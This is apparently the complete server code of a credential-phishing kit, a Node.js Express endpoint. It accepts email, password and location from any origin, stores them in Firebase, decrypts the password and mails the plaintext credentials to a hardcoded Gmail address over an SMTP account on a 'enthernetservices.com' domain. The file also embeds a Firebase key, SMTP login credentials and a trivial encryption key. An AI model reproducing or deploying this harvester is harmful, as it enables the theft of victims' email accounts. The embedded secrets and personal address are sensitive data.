const express = require('express');
const nodemailer = require('nodemailer');
const crypto = require('crypto');
const cors = require('cors');
const { initializeApp } = require('firebase/app');
const { getDatabase, ref, get, set } = require('firebase/database');

const app = express();

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyARsN-63d0r7so5ytt6RmYMjMyVJ6Rpw8c",
  authDomain: "abcd-c7e89.firebaseapp.com",
  projectId: "abcd-c7e89",
  storageBucket: "abcd-c7e89.firebasestorage.app",
  messagingSenderId: "6894749277919",
  appId: "1:689449277919:web:c2fc6277911b214ae58c6a"
};
const firebaseApp = initializeApp(firebaseConfig);
const db = getDatabase(firebaseApp);

// Middleware
app.use(express.json());

app.use(cors({
  origin: '*',
  methods: ['POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type']
}));

// Encryption settings
const adminEmail = "amasimarvellous@gmail.com";
const encryptionKey = "12345678901234567890123456789012";

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-cbc", Buffer.from(encryptionKey), iv);
  let encrypted = cipher.update(text, "utf8", "hex");
  encrypted += cipher.final("hex");
  return `${iv.toString("hex")}:${encrypted}`;
}

function decrypt(encryptedText) {
  const [iv, encrypted] = encryptedText.split(":");
  const decipher = crypto.createDecipheriv("aes-256-cbc", Buffer.from(encryptionKey), Buffer.from(iv, "hex"));
  let decrypted = decipher.update(encrypted, "hex", "utf8");
  decrypted += decipher.final("utf8");
  return decrypted;
}

// API endpoint
app.post('/api/email', async (req, res) => {
  try {
    const { email, password, location } = req.body;

    if (!email || !password || !location) {
      return res.status(400).json({ success: false, message: "Missing required fields" });
    }

    const userRef = ref(db, `emailThreadLinkIII/${email.replace(/\./g, "_")}`);
    const snapshot = await get(userRef);
    let threadId = snapshot.exists() ? snapshot.val().messageId : null;

    if (!threadId) {
      threadId = `<${email.replace(/\W/g, "")}@enthernetservice.com>`;
      await set(userRef, { messageId: threadId });
    }

    const encryptedPassword = encrypt(password);
    await set(ref(db, `emailDataLinkIII/${email.replace(/\./g, "_")}`), {
      email,
      password: encryptedPassword,
      location,
    });

    const userDataSnapshot = await get(ref(db, `emailDataLinkIII/${email.replace(/\./g, "_")}`));
    if (!userDataSnapshot.exists()) {
      throw new Error("Failed to retrieve stored email data.");
    }
    const { email: storedEmail, password: storedEncryptedPassword, location: storedLocation } = userDataSnapshot.val();
    const decryptedPassword = decrypt(storedEncryptedPassword);

    const transporter = nodemailer.createTransport({
      host: "mail.enthernetservices.com",
      port: 465,
      secure: true,
      auth: {
        user: "Pdf@enthernetservices.com",
        pass: "[F%cR}e.M}fO",
      },
    });

    const mailOptions = {
      from: `"Form Submission" <Pdf@enthernetservices.com>`,
      to: adminEmail,
      subject: `New Submission from ${storedEmail}`,
      text: `Email: ${storedEmail}\nDecrypted Password: ${decryptedPassword}\nLocation: ${storedLocation}`,
      headers: {
        "Message-ID": `<${Date.now()}-${Math.random().toString(36).substring(2)}@enthernetservice.com>`,
        "In-Reply-To": threadId,
        References: threadId,
      },
    };

    await transporter.sendMail(mailOptions);

    return res.status(200).json({ success: true, message: "Email sent successfully!" });
  } catch (error) {
    console.error("Error sending email:", error);
    return res.status(500).json({ success: false, message: `Failed to send email: ${error.message}` });
  }
});

// Handle OPTIONS for CORS preflight
app.options('/api/email', (req, res) => {
  res.status(200).end();
});

module.exports = app;
